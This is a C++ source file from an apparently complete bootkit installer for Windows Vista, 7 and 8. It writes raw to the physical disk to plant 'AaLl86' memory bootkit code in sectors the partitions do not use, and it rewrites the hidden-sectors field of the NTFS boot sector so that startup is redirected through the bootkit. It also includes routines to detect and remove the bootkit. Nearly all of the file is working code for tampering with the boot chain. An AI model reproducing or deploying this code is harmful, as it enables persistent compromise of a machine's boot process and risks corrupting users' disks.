#include "stdafx.h"
#include "BootkitMbrSetup.h"
#include "PeResource.h"
#include "VariousStuff.h"
#include <WinIoCtl.h>

// Install bootkit on a FIXED disk in system boot partition VBR
bool CBootkitMbrSetup::VbrInstallBootkit(DWORD drvNum, BYTE bootDiskIdx) {
	TCHAR hdName[0x20] = {0};						// Setup Physical disk device DOS Name
	TCHAR drvNumStr[0x4] = {0};						// Drive number string

	BOOTKIT_TYPE btkType;
	// Get suggested bootktit type for this system
	if (g_btkType == BOOTKIT_TYPE_UNKNOWN_OR_AUTO) {
		btkType = GetBootkitTypeForSystem();
		if (btkType != BOOTKIT_TYPE_STANDARD)
			g_pLog->WriteLine(L"VbrInstallBootkit - Detected non-standard Windows Loader on this System. I'll use Compatible Bootkit type (no Bootmgr signature needed).");
	} else
		btkType = g_btkType;

	// Initialize this function Base data
	wcscpy_s(hdName, COUNTOF(hdName), L"\\\\.\\PhysicalDrive\0\0");
	_itow(drvNum, drvNumStr, 10);
	wcscat_s(hdName, COUNTOF(hdName), drvNumStr);
	return DevVbrInstallBootkit(hdName, btkType, bootDiskIdx);
}

// Remove bootkit from a VBR of a bootable partition of a fixed disk
bool CBootkitMbrSetup::VbrRemoveBootkit(DWORD drvNum) {
	TCHAR hdName[0x20] = {0};						// Setup Physical disk device DOS Name
	TCHAR drvNumStr[0x4] = {0};						// Drive number string

	// Initialize this function Base data
	wcscpy_s(hdName, COUNTOF(hdName), L"\\\\.\\PhysicalDrive\0\0");
	_itow(drvNum, drvNumStr, 10);
	wcscat_s(hdName, COUNTOF(hdName), drvNumStr);
	
	return DevVbrRemoveBootkit(hdName);
}

// Install Memory bootkit in a particular boot partition Vbr
bool CBootkitMbrSetup::DevVbrInstallBootkit(LPTSTR devName, BOOTKIT_TYPE btkType, BYTE bootDiskIdx) {
	HANDLE hDrive = NULL;							// Current hard disk handle
	BOOL retVal = 0;								// Win32 API returned value
	DWORD lastErr = 0;								// Last win32 Error
	MASTER_BOOT_RECORD mbr = {0};					// Read Master Boot Sector
	DWORD dwBytesRead = 0;							// Total number of bytes read
	DISK_GEOMETRY_EX diskGeom = {0};				// Disk geometry structure 
	PARTITION_ELEMENT * pBootPart = {0};			// Bootable partition pointer
	NTFS_BOOT_SECTOR ntfsSect = {0};				// Found bootable NTFS sector content
	DWORD dwBootkitStartSect = 0;					// Bootkit starting sector number
	DWORD dwResSize = 0;							// Resource size
	LPBYTE lpCurRes = NULL;							// Current resource pointer
	LARGE_INTEGER drvPtr = {0};						// hDrive file pointer

	// Open Disk device object
	hDrive = CreateFile(devName, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	lastErr = GetLastError();
	if (hDrive == INVALID_HANDLE_VALUE) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::VbrInstallBootkit - Unable to open \"%s\" for reading...", (LPVOID)devName);
		return false;
	}

	// |---------------------------------------------------------------------------------------------------------------------------------------|
	// |  0. Read System Mbr and analyze it
	retVal = ReadFile(hDrive, (LPVOID)&mbr, sizeof(mbr), &dwBytesRead, NULL);
	lastErr = GetLastError();
	if (!retVal) {
		// Error while reading Disk
		g_pLog->WriteLine(L"CBootkitMbrSetup::VbrInstallBootkit - Unable to read original Mbr from \"%s\". Last Error: %i",
			(LPVOID)devName, (LPVOID)lastErr);
		CloseHandle(hDrive);
		return false;
	}

	// And analyze it
	DWORD dwFirstPartSect = 0;			// First Partition Sector
	DWORD dwLastPartSect = 0;			// Last partition Sector
	DWORD dwTotalDiskSect = 0;			// Total disk sector

	for (int i = 0; i < 4; i++) {
		PARTITION_ELEMENT & curElem = mbr.PTable.Partition[i];
		if (!curElem.FileSystemType) continue;

		if (curElem.Bootable == 0x80) {
			// Bootable partition found
			pBootPart = &curElem;
		}

		// Get first partition sector
		if (curElem.FreeSectorsBefore) {
			if ((curElem.FreeSectorsBefore < dwFirstPartSect) || !dwFirstPartSect) 
				dwFirstPartSect = curElem.FreeSectorsBefore;
		}
		// Get last partition sector
		if (dwLastPartSect <= (curElem.FreeSectorsBefore + curElem.TotalSectors)) 
			dwLastPartSect = curElem.FreeSectorsBefore + curElem.TotalSectors;
	}

	// Check bootable partition and FS type
	if (!pBootPart || pBootPart->FileSystemType != NTFS_MBR_FSTYPE) {
		CloseHandle(hDrive);
		g_pLog->WriteLine(L"CBootkitMbrSetup::VbrInstallBootkit - Unable to find NTFS bootable partition" 
			L" on disk \"%s\".", devName);
		return false;
	}

	// Get disk Geometry to obtain Total Disk Sector
	retVal = DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, (LPVOID)&diskGeom, sizeof( DISK_GEOMETRY_EX), &dwBytesRead, NULL);
	if (!retVal) {
		// No disk geometry
		dwTotalDiskSect = dwLastPartSect;
		diskGeom.Geometry.BytesPerSector = 0x200;
	} else
		dwTotalDiskSect = (DWORD)(diskGeom.DiskSize.QuadPart / diskGeom.Geometry.BytesPerSector);

	// Define how to install Bootkit
	if (dwFirstPartSect >= 0x14) 
		// Install in Hard Disk starting area
		dwBootkitStartSect = 0x10;
	 
	else if ((dwLastPartSect + 0x9) < dwTotalDiskSect) 
		// Install in Hard Disk ending area
		dwBootkitStartSect = dwLastPartSect + 0x06;
	// |---------------------------------------------------------------------------------------------------------------------------------------|


	// |---------------------------------------------------------------------------------------------------------------------------------------|
	// |  1. Read System NTFS boot record and analyze it
	drvPtr.QuadPart = (LONGLONG)pBootPart->FreeSectorsBefore * diskGeom.Geometry.BytesPerSector;
	SetFilePointerEx(hDrive, drvPtr, &drvPtr, FILE_BEGIN);
	retVal = ReadFile(hDrive, (LPVOID)&ntfsSect, sizeof(ntfsSect), &dwBytesRead, 0);
	lastErr = GetLastError();

	if (!retVal || memcmp(ntfsSect.chOemID, NTFS_SIGNATURE, sizeof(ntfsSect.chOemID)) != 0) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::VbrInstallBootkit - Unable to read NTFS boot sector from "
		L"sector 0x%08x of drive \"%s\".", (LPVOID)pBootPart->FreeSectorsBefore, (LPVOID)devName);
		CloseHandle(hDrive);
		return false;
	}

	// The following 2 lines are placed here only for security reasons
	_ASSERT(ntfsSect.BPB.dqHiddenSec == (QWORD)pBootPart->FreeSectorsBefore);
	ntfsSect.BPB.dqHiddenSec = (QWORD)pBootPart->FreeSectorsBefore;
	// |---------------------------------------------------------------------------------------------------------------------------------------|

	// |---------------------------------------------------------------------------------------------------------------------------------------|
	// 2. Extract VBR Starter 
	lpCurRes = CPeResource::Extract(MAKEINTRESOURCE(IDR_BINSTARTER_VBR), L"Binary", &dwResSize);
	lastErr = GetLastError();
	if (!lpCurRes || !dwResSize) {
		// Resource extraction error
		g_pLog->WriteLine(L"CBootkitMbrSetup::VbrInstallBootkit - Unable to extract bootkit starter program from myself. Last Error: %i", (LPVOID)lastErr);
		CloseHandle(hDrive); return false;
	}

	LPBYTE buff = NULL;							// Generic buffer
	DWORD buffSize = dwResSize;					// Buffer Size
	buff = new BYTE[buffSize];
	PBOOTKIT_VBR_STARTER pVbrStarter = (PBOOTKIT_VBR_STARTER)buff;
	RtlCopyMemory(buff, lpCurRes, buffSize);
	
	// Compile and write it
	DWORD dwBtkSize = CPeResource::SizeOfRes(MAKEINTRESOURCE(IDR_BINMAIN), L"BINARY");
	pVbrStarter->dwOrgHiddenSector = (DWORD)ntfsSect.BPB.dqHiddenSec;
	pVbrStarter->uchBootDrive = bootDiskIdx;
	pVbrStarter->wBtkProgramSize = (WORD)((dwBtkSize + 0x1F0) / diskGeom.Geometry.BytesPerSector);
	
	// Write it
	drvPtr.QuadPart = (LONGLONG)dwBootkitStartSect * diskGeom.Geometry.BytesPerSector;
	retVal = SetFilePointerEx(hDrive, drvPtr, &drvPtr, FILE_BEGIN); 
	if (retVal) retVal = WriteFile(hDrive, buff, buffSize, &dwBytesRead, NULL);
	lastErr = GetLastError();
	delete[] buff;			// We no longer need it
	if (!retVal) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::VbrInstallBootkit - Unable to write bootkit starter program. Last error: %i.", (LPVOID)lastErr);
		CloseHandle(hDrive); return false;
	} else
		g_pLog->WriteLine(L"CBootkitMbrSetup::VbrInstallBootkit - Successfully written bootkit starter program on sector 0x%08x of drive \"%s\".",
			(LPVOID)dwBootkitStartSect, (LPVOID)devName);
	// |---------------------------------------------------------------------------------------------------------------------------------------|

	// 2. Extract, write and compile bootkit program
	// Update NTFS hidden sector and increse target sector number	
	ntfsSect.BPB.dqHiddenSec = (QWORD)dwBootkitStartSect - 1;
	dwBootkitStartSect += (dwResSize + 0x1F0) / diskGeom.Geometry.BytesPerSector;
	retVal = WriteBtkProgram(hDrive, (QWORD)dwBootkitStartSect, btkType, diskGeom.Geometry.BytesPerSector);
	if (!retVal) { CloseHandle(hDrive); return false; }

	// 3. Write modified NTFS Boot Sector
	drvPtr.QuadPart = (LONGLONG)pBootPart->FreeSectorsBefore * diskGeom.Geometry.BytesPerSector;
	retVal = SetFilePointerEx(hDrive, drvPtr, &drvPtr, FILE_BEGIN);
	if (retVal) retVal = WriteFile(hDrive, (LPVOID)&ntfsSect, sizeof(ntfsSect), &dwBytesRead, 0);
	lastErr = GetLastError();

	if (!retVal) 
		g_pLog->WriteLine(L"CBootkitMbrSetup::VbrInstallBootkit - Unable to update system NTFS boot partition. Last error: %i.", (LPVOID)lastErr);
	else
		g_pLog->WriteLine(L"CBootkitMbrSetup::VbrInstallBootkit - Successfully updated bootstrap code of system NTFS boot partition.");

	CloseHandle(hDrive);
	return (retVal != FALSE);
}

// Search for bootable partition of drive, and then remove bootkit from its Vbr
bool CBootkitMbrSetup::DevVbrRemoveBootkit(LPTSTR devName) {
	HANDLE hDrive = NULL;							// Current hard disk handle
	BOOL retVal = 0;								// Win32 API returned value
	DWORD lastErr = 0;								// Last win32 Error
	MASTER_BOOT_RECORD mbr = {0};					// Read Master Boot Sector
	DWORD dwBytesRead = 0;							// Total number of bytes read
	DISK_GEOMETRY_EX diskGeom = {0};				// Disk geometry structure 
	PARTITION_ELEMENT * pBootPart = {0};			// Bootable partition pointer
	NTFS_BOOT_SECTOR ntfsSect = {0};				// Found bootable NTFS sector content
	DWORD dwBootkitStartSect = 0;					// Bootkit starting sector number
	DWORD dwResSize = 0;							// Resource size
	LARGE_INTEGER diskOffset = {0};					// hDrive file pointer

	// Open Disk device object
	hDrive = CreateFile(devName, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	lastErr = GetLastError();
	if (hDrive == INVALID_HANDLE_VALUE) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::DevVbrRemoveBootkit - Unable to open \"%s\" for reading...", (LPVOID)devName);
		return false;
	}

	// |---------------------------------------------------------------------------------------------------------------------------------------|
	// |  0. Read System Mbr and analyze it
	retVal = ReadFile(hDrive, (LPVOID)&mbr, sizeof(mbr), &dwBytesRead, NULL);
	lastErr = GetLastError();
	if (!retVal) {
		// Error while reading Disk
		g_pLog->WriteLine(L"CBootkitMbrSetup::DevVbrRemoveBootkit - Unable to read original Mbr from \"%s\". Last Error: %i",
			(LPVOID)devName, (LPVOID)lastErr);
		CloseHandle(hDrive);
		return false;
	}

	// And analyze it
	DWORD dwTotalSectors = 0;			// Total disk sectors

	for (int i = 0; i < 4; i++) {
		PARTITION_ELEMENT & curElem = mbr.PTable.Partition[i];
		if (!curElem.FileSystemType) continue;

		if (curElem.Bootable == 0x80) {
			// Bootable partition found
			pBootPart = &curElem;
		}
		// Get last partition sector
		if (dwTotalSectors <= (curElem.FreeSectorsBefore + curElem.TotalSectors)) 
			dwTotalSectors = curElem.FreeSectorsBefore + curElem.TotalSectors;
	}
	
	// Get disk Geometry to obtain Total Disk Sector
	retVal = DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, (LPVOID)&diskGeom, sizeof( DISK_GEOMETRY_EX), &dwBytesRead, NULL);
	if (!retVal) 
		// No disk geometry
		diskGeom.Geometry.BytesPerSector = 0x200;
	else
		dwTotalSectors = (DWORD)(diskGeom.DiskSize.QuadPart / diskGeom.Geometry.BytesPerSector);
	
	// Check bootable partition and FS type
	if (!pBootPart || pBootPart->FileSystemType != NTFS_MBR_FSTYPE) {
		CloseHandle(hDrive);
		g_pLog->WriteLine(L"CBootkitMbrSetup::DevVbrRemoveBootkit - Unable to find NTFS bootable partition" 
			L" on disk \"%s\".", devName);
		return false;
	}
	// |---------------------------------------------------------------------------------------------------------------------------------------|

	// |---------------------------------------------------------------------------------------------------------------------------------------|
	// |  1. Read System NTFS boot record and analyze it
	diskOffset.QuadPart = (LONGLONG)pBootPart->FreeSectorsBefore * diskGeom.Geometry.BytesPerSector;
	SetFilePointerEx(hDrive, diskOffset, &diskOffset, FILE_BEGIN);
	retVal = ReadFile(hDrive, (LPVOID)&ntfsSect, sizeof(ntfsSect), &dwBytesRead, 0);
	lastErr = GetLastError();

	if (!retVal || memcmp(ntfsSect.chOemID, NTFS_SIGNATURE, sizeof(ntfsSect.chOemID)) != 0) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::DevVbrRemoveBootkit - Unable to read NTFS boot sector from "
		L"sector 0x%08x of drive \"%s\".", (LPVOID)pBootPart->FreeSectorsBefore, (LPVOID)devName);
		CloseHandle(hDrive); return false;
	}
	dwBootkitStartSect = (DWORD)ntfsSect.BPB.dqHiddenSec + 1;
	// |---------------------------------------------------------------------------------------------------------------------------------------|

	// |---------------------------------------------------------------------------------------------------------------------------------------|
	// 2. Get real disk hidden sector
	BYTE vbrBuff[1024] = {0};						// VBR Starter buffer
	PBOOTKIT_VBR_STARTER pVbrStarter =				// VBR Starter pointer
		(PBOOTKIT_VBR_STARTER)vbrBuff;
	DWORD orgHiddenSectors = 0;						// Original NTFS hidden sector
	diskOffset.QuadPart = (QWORD)dwBootkitStartSect * diskGeom.Geometry.BytesPerSector;
	if ((DWORD)ntfsSect.BPB.dqHiddenSec > dwTotalSectors - 0x4) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::DevVbrRemoveBootkit - Internal error. Found NTFS boot partition hidden sectors (0x%08x) "
			L"is bigger then total disk sectors.", (LPVOID)ntfsSect.BPB.dqHiddenSec);
		CloseHandle(hDrive); return false;
	}
	SetFilePointerEx(hDrive, diskOffset, &diskOffset, FILE_BEGIN);
	retVal = ReadFile(hDrive, (LPVOID)vbrBuff, diskGeom.Geometry.BytesPerSector, &dwBytesRead, 0);
	lastErr = GetLastError();

	if (!retVal || strcmp(pVbrStarter->signature, "AaLl86") != 0) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::DevVbrRemoveBootkit - Error! Unable to read x86 Memory bootkit sectors"
			L" (starting from 0x%08x).", (LPVOID)ntfsSect.BPB.dqHiddenSec);
		CloseHandle(hDrive); return false;
	}

	// Save original sectors number
	orgHiddenSectors = pVbrStarter->dwOrgHiddenSector;
	// |---------------------------------------------------------------------------------------------------------------------------------------|

	// |---------------------------------------------------------------------------------------------------------------------------------------|
	// 3. Update NTFS boot sector and zero out bootkit sectors
	ntfsSect.BPB.dqHiddenSec = (QWORD)orgHiddenSectors;
	diskOffset.QuadPart = (LONGLONG)pBootPart->FreeSectorsBefore * diskGeom.Geometry.BytesPerSector;
	retVal = SetFilePointerEx(hDrive, diskOffset, &diskOffset, FILE_BEGIN);
	if (retVal) retVal = WriteFile(hDrive, (LPVOID)&ntfsSect, sizeof(ntfsSect), &dwBytesRead, 0);
	lastErr = GetLastError();

	if (retVal)
		g_pLog->WriteLine(L"CBootkitMbrSetup::DevVbrRemoveBootkit - Successfully updated NTFS system boot partition (sector 0x%08x).", 
			(LPVOID)pBootPart->FreeSectorsBefore);
	else {
		g_pLog->WriteLine(L"CBootkitMbrSetup::DevVbrRemoveBootkit - Unable to update NTFS system boot partition (sector 0x%08x)."
			L" Last error: %i.", (LPVOID)pBootPart->FreeSectorsBefore, (LPVOID)lastErr);
		CloseHandle(hDrive); return false;
	}

	// Now zero out bootkit sectors
	dwResSize = CPeResource::SizeOfRes(MAKEINTRESOURCE(IDR_BINSTARTER_VBR), L"BINARY");
	if (dwResSize) {
		dwResSize = (dwResSize + 0x1F0) & 0xFFFFFE00;			// Align to sector boundaries
		dwResSize += CPeResource::SizeOfRes(MAKEINTRESOURCE(IDR_BINMAINNS), L"BINARY");
		dwResSize = (dwResSize + 0x1F0) & 0xFFFFFE00;			// Align to sector boundaries
		if (dwResSize > 8192) dwResSize = 8192;
		
		// Allocate enough zeroed buffer
		LPBYTE zeroBuff = new BYTE[dwResSize];
		RtlZeroMemory(zeroBuff, dwResSize);

		diskOffset.QuadPart = (LONGLONG)dwBootkitStartSect * diskGeom.Geometry.BytesPerSector;
		retVal =  SetFilePointerEx(hDrive, diskOffset, &diskOffset, FILE_BEGIN);
		if (retVal) retVal = WriteFile(hDrive, zeroBuff, dwResSize, &dwBytesRead, NULL);
		lastErr = GetLastError();
		delete[] zeroBuff;

		if (retVal) 
			g_pLog->WriteLine(L"DevVbrRemoveBootkit - Successfully zeroed out #%i sectors (starting from 0x%08x) of \"%s\" device.",
				(LPVOID)(dwResSize / diskGeom.Geometry.BytesPerSector), (LPVOID)dwBootkitStartSect, (LPVOID)devName);
		else
			g_pLog->WriteLine(L"DevVbrRemoveBootkit - Unable to clean #%i sectors (starting from 0x%08x) of \"%s\" device.",
				(LPVOID)(dwResSize / diskGeom.Geometry.BytesPerSector), (LPVOID)dwBootkitStartSect, (LPVOID)devName);
	}
	// |---------------------------------------------------------------------------------------------------------------------------------------|

	CloseHandle(hDrive); 
	return true;
}

// Get if bootkit is installed on Device VBR
BOOTKIT_STATE CBootkitMbrSetup::IsBootkitInstalledInVbr(HANDLE hDrive, LPTSTR devName) {
	BOOL retVal = 0;								// Win32 API returned value
	DWORD lastErr = 0;								// Last win32 Error
	MASTER_BOOT_RECORD mbr = {0};					// Read Master Boot Sector
	DWORD dwBytesRead = 0;							// Total number of bytes read
	PARTITION_ELEMENT * pBootPart = {0};			// Bootable partition pointer
	NTFS_BOOT_SECTOR ntfsSect = {0};				// Found bootable NTFS sector content
	LARGE_INTEGER diskOffset = {0},					// hDrive Disk pointer
		 oldDiskOffset = {0};						// hDrive old Disk pointer
	DISK_GEOMETRY_EX diskGeom = {0};				// Disk geometry structure 
	DWORD sectSize = SECTOR_SIZE;					// Disk sector size
	DWORD dwBootkitStartSect = 0;					// Bootkit starting sector number
	BOOTKIT_STATE outState = BOOTKIT_STATE_UNKNOWN;
	if (!hDrive && !devName) return outState;
	if (!hDrive) {
		DbgBreak();			// NOT implemented
		RaiseException(STATUS_NOT_IMPLEMENTED, 0, 0, 0);
	}

	// 0. Read System Mbr and analyze it
	SetFilePointerEx(hDrive, diskOffset, &oldDiskOffset, FILE_BEGIN);
	retVal = ReadFile(hDrive, (LPVOID)&mbr, sizeof(mbr), &dwBytesRead, NULL);
	lastErr = GetLastError();
	SetFilePointerEx(hDrive, oldDiskOffset, NULL, FILE_BEGIN);
	if (!retVal) {
		// Error while reading Disk
		g_pLog->WriteLine(L"CBootkitMbrSetup::IsBootkitInstalledInVbr - Unable to read original Mbr of drive \"%s\". Last Error: %i",
			(LPVOID)devName, (LPVOID)lastErr);
		return BOOTKIT_STATE_UNKNOWN;
	}

	// Get disk Geometry to obtain Total Disk Sector
	retVal = DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, (LPVOID)&diskGeom, sizeof( DISK_GEOMETRY_EX), &dwBytesRead, NULL);
	if (retVal) sectSize = diskGeom.Geometry.BytesPerSector;

	for (int i = 0; i < 4; i++) {
		PARTITION_ELEMENT & curElem = mbr.PTable.Partition[i];
		if (!curElem.FileSystemType) continue;

		if (curElem.Bootable == 0x80) 
			// Bootable partition found
			pBootPart = &curElem;
	}

	// Check bootable partition and FS type
	if (!pBootPart || pBootPart->FileSystemType != NTFS_MBR_FSTYPE) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::IsBootkitInstalledInVbr - Unable to find NTFS bootable partition" 
			L" on disk \"%s\".", devName);
		return BOOTKIT_NOT_PRESENT;
	}

	// |---------------------------------------------------------------------------------------------------------------------------------------|
	// |  1. Read System NTFS boot record and analyze it
	diskOffset.QuadPart = (LONGLONG)pBootPart->FreeSectorsBefore * sectSize;
	SetFilePointerEx(hDrive, diskOffset, NULL, FILE_BEGIN);
	retVal = ReadFile(hDrive, (LPVOID)&ntfsSect, sizeof(ntfsSect), &dwBytesRead, 0);
	lastErr = GetLastError();
	SetFilePointerEx(hDrive, oldDiskOffset, NULL, FILE_BEGIN);

	if (!retVal || memcmp(ntfsSect.chOemID, NTFS_SIGNATURE, sizeof(ntfsSect.chOemID)) != 0) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::IsBootkitInstalledInVbr - Unable to read NTFS boot sector from "
		L"sector 0x%08x of drive \"%s\".", (LPVOID)pBootPart->FreeSectorsBefore, (LPVOID)devName);
		return BOOTKIT_NOT_PRESENT;
	}
	dwBootkitStartSect = (DWORD)ntfsSect.BPB.dqHiddenSec + 1;
	if (dwBootkitStartSect == pBootPart->FreeSectorsBefore) 
		return BOOTKIT_NOT_PRESENT;
	// |---------------------------------------------------------------------------------------------------------------------------------------|

	// |---------------------------------------------------------------------------------------------------------------------------------------|
	// |  2. Read Bootkit sectors and analyze them
	LPBYTE btkBuff = new BYTE[sectSize * 2];
	BOOTKIT_VBR_STARTER * pBtkStarter = (BOOTKIT_VBR_STARTER*)btkBuff;
	PBOOTKIT_PROGRAM pBtkMain = (PBOOTKIT_PROGRAM)(btkBuff + sectSize);
	RtlZeroMemory(btkBuff, sectSize * 2);
	diskOffset.QuadPart = (LONGLONG)dwBootkitStartSect * sectSize;
	SetFilePointerEx(hDrive, diskOffset, NULL, FILE_BEGIN);
	retVal = ReadFile(hDrive, (LPVOID)btkBuff, sectSize * 2, &dwBytesRead, 0);
	lastErr = GetLastError();
	SetFilePointerEx(hDrive, oldDiskOffset, NULL, FILE_BEGIN);

	// Analyze starter
	if (!retVal) {
		// Read error
		g_pLog->WriteLine(L"CBootkitMbrSetup::IsBootkitInstalledInVbr - Unable to read bootkit Sectors (start 0x%08x) "
			L" from \"%s\". Last error: %i.", (LPVOID)dwBootkitStartSect, (LPVOID)devName, (LPVOID)lastErr);
		outState = BOOTKIT_STATE_UNKNOWN;
	}
	else if (strcmp(pBtkStarter->signature, "AaLl86") == 0 &&
		strcmp(pBtkMain->signature, "AaLl86") == 0) {
		// Bootkit is installed
		_ASSERT(pBtkStarter->uchStarterType == 2);			// Assure that this is a VBR Starter
		g_pLog->WriteLine(L"BootkitVbrSetup - Found an active and valid AaLl86 x86 Memory Bootkit (sector 0x%08x) linked to "
			L"System boot partition of disk \"%s\".", (LPVOID)dwBootkitStartSect, (LPVOID)devName);
		outState = BOOTKIT_INSTALLED;
	} else
		// Bootkit not present
		outState = BOOTKIT_NOT_PRESENT;
	// |---------------------------------------------------------------------------------------------------------------------------------------|

	// Free up resources
	delete[] btkBuff;
	return outState;
}

// Extract, compile and Write bootkit program to hard disk
bool CBootkitMbrSetup::WriteBtkProgram(HANDLE hDrive, QWORD sectNum, BOOTKIT_TYPE btkType, DWORD sectSize) {
	BOOL retVal = 0;								// Win32 API returned value
	WORD resId = 0;									// Current Resource ID
	DWORD dwResSize = 0;							// Resource size
	LPBYTE lpCurRes = NULL;							// Current resource pointer
	DWORD dwMemLicenseStartRva = 0;					// Memory license start search RVA
	DWORD dwBootmgrSign = 0;						// Bootmgr Signature
	BYTE bBootmgrStartByte = 0;						// Bootmgr Start byte
	LPBYTE buff = NULL;								// Generic buffer
	LARGE_INTEGER diskOffset = {0},					// hDrive Disk pointer
		 oldDiskOffset = {0};						// hDrive old Disk pointer
	DWORD lastErr = 0;								// Last win32 Error
	DWORD dwBytesRead = 0;							// Total number of bytes read
	DWORD dwBtkProgramSize = 0;						// Bootkit program code size
	OSVERSIONINFOEX verInfo =						// Current OS Version Info
		{sizeof(OSVERSIONINFOEX), 0};
	GetVersionEx((LPOSVERSIONINFO)&verInfo);		

	if (!hDrive) return false;

	// Extract bootmgr signature (if needed)
	_ASSERT(btkType != BOOTKIT_TYPE_UNKNOWN_OR_AUTO);
	if (btkType == BOOTKIT_TYPE_UNKNOWN_OR_AUTO) return false;
	if (btkType == BOOTKIT_TYPE_STANDARD) {
		// Get bootmgr Signautre
		retVal = GetBootmgrSignature(&bBootmgrStartByte, &dwBootmgrSign);
		if (!retVal) {
			g_pLog->WriteLine(L"CBootkitMbrSetup::WriteBtkProgram - Unable to obtain Bootmgr signature!");
			return false;
		}
	}

	if (verInfo.dwMajorVersion == 6) {
		if (btkType == BOOTKIT_TYPE_STANDARD) resId = IDR_BINMAIN;
		else resId = IDR_BINMAINNS;
		if (verInfo.dwMinorVersion == 0) 
			// Windows Vista
			dwMemLicenseStartRva = 0x0340000;
		else if (verInfo.dwMinorVersion == 1) 
			// Windows 7
			dwMemLicenseStartRva = 0x0340000;
		else {
			// Windows 8
			dwMemLicenseStartRva = 0x0500000;
		}
		lpCurRes = CPeResource::Extract(MAKEINTRESOURCE(resId), L"BINARY", &dwResSize);
		_ASSERT(dwResSize <= 2048);
		lastErr = GetLastError();
	} else {
		// Operation system error
		g_pLog->WriteLine(L"CBootkitMbrSetup::WriteBtkProgram - Operation system error (%i.%i.%i)! This application is compatible only with Windows Vista, Seven or Eight.",
			(LPVOID)verInfo.dwMajorVersion, (LPVOID)verInfo.dwMinorVersion, (LPVOID)verInfo.dwBuildNumber);
		return false;
	}

	// Extract starter
	if (!lpCurRes || !dwResSize) {
		// Resource extraction error
		g_pLog->WriteLine(L"CBootkitMbrSetup::WriteBtkProgram - Unable to extract bootkit program code from myself. Last Error: %i", (LPVOID)lastErr);
		return false;
	}
	
	// Get right bootkit code sector
	dwBtkProgramSize = dwResSize;

	// Compile bootkit program
	buff = new BYTE[dwResSize];
	RtlCopyMemory(buff, lpCurRes, dwResSize);
	BOOTKIT_PROGRAM * pBtkPrg = (PBOOTKIT_PROGRAM)buff;
	pBtkPrg->dwBmMainOffset = 0x0A8C;
	if (btkType == BOOTKIT_TYPE_STANDARD) {
		pBtkPrg->bBmSignFirstByte = bBootmgrStartByte;
		pBtkPrg->dwBmSignature = dwBootmgrSign;
	} else {
		// Leave all values intact, indeed they are hard-coded into Bootkit Program
	}
	pBtkPrg->dwMemLicStartRva = dwMemLicenseStartRva;

	// and Write it
	diskOffset.QuadPart = sectNum * sectSize;
	retVal = SetFilePointerEx(hDrive, diskOffset, &oldDiskOffset, FILE_BEGIN);  
	if (retVal)
		retVal = WriteFile(hDrive, (LPVOID)buff, dwResSize,  &dwBytesRead, NULL);
	lastErr = GetLastError();

	// Restore old disk pointer
	SetFilePointerEx(hDrive, oldDiskOffset, NULL, FILE_BEGIN);  
	delete[] buff;			// We no longer need it

	if (!retVal) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::WriteBtkProgram - Unable to write bootkit program in sector 0x%08X. Last error: %i.",
			(LPVOID)sectNum, (LPVOID)lastErr);
		return false;
	} else {
		g_pLog->WriteLine(L"CBootkitMbrSetup::WriteBtkProgram - Successfully written bootkit program in sector 0x%08X.", (LPVOID)sectNum);
		return true;
	}
}